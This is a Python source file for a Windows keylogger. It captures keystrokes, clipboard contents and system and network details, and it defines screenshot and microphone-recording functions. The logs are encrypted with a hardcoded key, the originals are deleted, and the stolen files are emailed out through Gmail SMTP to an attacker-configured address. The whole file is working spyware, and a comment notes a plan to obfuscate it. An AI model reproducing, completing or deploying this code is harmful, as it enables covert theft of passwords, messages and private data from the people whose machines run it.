import socket
import platform
import win32clipboard
import time
import os
import getpass
import sounddevice as sd
import smtplib
import threading
from pynput.keyboard import Key, Listener
from scipy.io.wavfile import write 
from cryptography.fernet import Fernet
from requests import get
from multiprocessing import Process, freeze_support
from PIL import ImageGrab
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from dotenv import load_dotenv

load_dotenv(".env")

keys_information = "log.txt"
system_information = "system.txt"
clipboard_information = "clipboard.txt"
screenshot_information = "screenshot.png"
audio_file = "audio.wav"
file_path = "C:\\Users\\1337\\Desktop\\Pypros 20\\kl v2"
extend = "\\"
file_merg = file_path + extend


#obfuscate this later
e_keys_information = "e_log.txt"
e_system_information = "e_system.txt"
e_clipboard_information = "e_clipboard.txt"


toaddr = os.getenv("toaddr")
fromaddr = os.getenv("fromaddr")
password = os.getenv("password")

key = "tDUvhqGGXBC1MnwoH5fR2H1sPpWhwdbc_RjZDiShODo="


def send_mail(filenames, attachments):
    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = 'Log Test'

    # body of the email
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    # iterate over the attachments
    for filename, attachment in zip(filenames, attachments):
        # attachment
        attachment_file = open(attachment, 'rb')

        # base
        p = MIMEBase('application', 'octet-stream')

        # encode msg
        p.set_payload((attachment_file).read())
        encoders.encode_base64(p)

        # add header
        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)

        msg.attach(p)

    # create smtp session
    s = smtplib.SMTP('smtp.gmail.com', 587)

    # start tls & login to gmail
    s.starttls()

    s.login(fromaddr, password)

    text = msg.as_string()

    s.sendmail(fromaddr, toaddr, text)

    s.quit()


def sys_info():
	with open(file_path + extend + system_information, "a+") as f:
		hostname = socket.gethostname()
		private_ip = socket.gethostbyname(hostname)
		try:
			public_ip = get("https://api.ipify.org").text
		except Exception:
			f.write("Public IP not found!")

		f.write("Processor: " + platform.processor() + "\n")
		f.write("System: " + platform.system() + " " + platform.version() + "\n")
		f.write("Machine: " + platform.machine() + "\n")
		f.write("Hostname: " + hostname + "\n")
		f.write("Public IP: " + public_ip + "\n")
		f.write("Private IP: " + private_ip + "\n")
		f.close()


def get_clipboard():
	with open(file_path + extend + clipboard_information, "a+") as f:
		# only works on copied text/string (no images, video, etc.)
		try:
			win32clipboard.OpenClipboard()
			copied_data = win32clipboard.GetClipboardData()
			win32clipboard.CloseClipboard()
			f.write("[COPIED]" + "\n" + copied_data + "\n")
		except:
			f.write("Clipboard data unreadable!")


def record_voice():
	# frequency
	fs = 44100
	# time to record
	seconds = 10

	myrecording = sd.rec(int(seconds * fs ), samplerate=fs, channels=2)
	sd.wait()

	write(file_path + extend + audio_file, fs, myrecording)


def screenshot():
	image = ImageGrab.grab()
	image.save(file_path + extend + screenshot_information)


#crating a list of file names and attachments paths for send_mail()
filenames = [e_keys_information, e_system_information, e_clipboard_information]
attachments = [file_merg + e_keys_information, file_merg + e_system_information, file_merg + e_clipboard_information]


current_time = time.time()
stop_time = time.time() + 15

count = 0
keys = []

def on_press(key):
	global keys, count, current_time

	print(key)
	keys.append(key)
	count += 1
	current_time = time.time()

	if count >= 1:
		count = 0
		write_file(keys)
		keys = []

def write_file(keys):
	with open(file_path + extend + keys_information, "a+") as f:
		# numpad keys are encoded! 
		for key in keys:
			k = str(key).replace("'", "")
			if k.find("space") > 0:
				f.write("\n")
				f.close()

			elif k.find("Key") == -1:
				f.write(k)
				f.close()

def encrypt_files():
	files_to_encrypt = [file_merg + system_information, file_merg + clipboard_information, file_merg + keys_information]
	encrypted_files = [file_merg + e_system_information, file_merg + e_clipboard_information, file_merg + e_keys_information]
	count = 0 

	for i in files_to_encrypt:
		with open(files_to_encrypt[count], 'rb') as f:
			data = f.read()

		fernet = Fernet(key)
		encrypted = fernet.encrypt(data)

		with open(encrypted_files[count], 'wb') as f:
			f.write(encrypted)

		count +=1


def delete_files():
	files_to_delete = [system_information, clipboard_information, keys_information]

	for file in files_to_delete:
		os.remove(file_merg + file)



def test_func():
	sys_info()
	get_clipboard()
	encrypt_files()
	delete_files()
	send_mail(filenames, attachments)


def on_release(key):
	if key == Key.esc:
		return False
	elif current_time > stop_time:
		test_func()
		return False


with Listener(on_press=on_press, on_release=on_release) as listener:
	listener.join()

